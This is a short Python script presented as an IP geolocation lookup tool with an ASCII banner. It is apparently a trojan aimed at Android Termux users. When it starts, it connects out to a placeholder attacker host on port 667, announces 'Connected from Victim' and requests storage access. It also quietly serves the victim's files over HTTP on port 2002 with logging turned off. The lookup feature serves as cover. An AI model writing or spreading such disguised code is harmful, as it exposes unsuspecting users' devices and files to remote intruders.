#!/usr/bin/env python3
import http.server
import socketserver
import threading
import _thread
import socket
import requests
import os


def reverse():
	soc = socket.socket()
	ip="attacker"  #Enter an attacker IP
	port=667      #Attacker port
	soc.connect((ip,port))
	soc.send(bytes("Connected from Victim","utf-8"))
	os.system('termux-setup-storage')    #storage access for android

reverse()

def create_server():
	class QuietHandler(http.server.SimpleHTTPRequestHandler):
    		def log_message(self, format, *args):
        		pass
	with socketserver.TCPServer(("", 2002), QuietHandler) as httpd:
			httpd.serve_forever()

_thread.start_new_thread(create_server,())


def web():
	inp = input("Enter the IP: ")
	if inp == 'Q':
		print('Bye')	
		exit()
	else:
		req =requests.get("http://api.hackertarget.com/geoip/?q="+inp)
		print(req.text)

while True:
	banner=""" 
                    _                     
                   | |                    
  ___  __ _ _   _  | |__   ___  ___ _ __  
 / __|/ _` | | | | | '_ \ / _ \/ _ \ '_ \ 
 \__ \ (_| | |_| | | |_) |  __/  __/ |_) |
 |___/\__,_|\__, | |_.__/ \___|\___| .__/ 
             __/ |                 | |    
            |___/                  |_|      	
	Q for Exit 	"""
	print(banner)
	web()
	




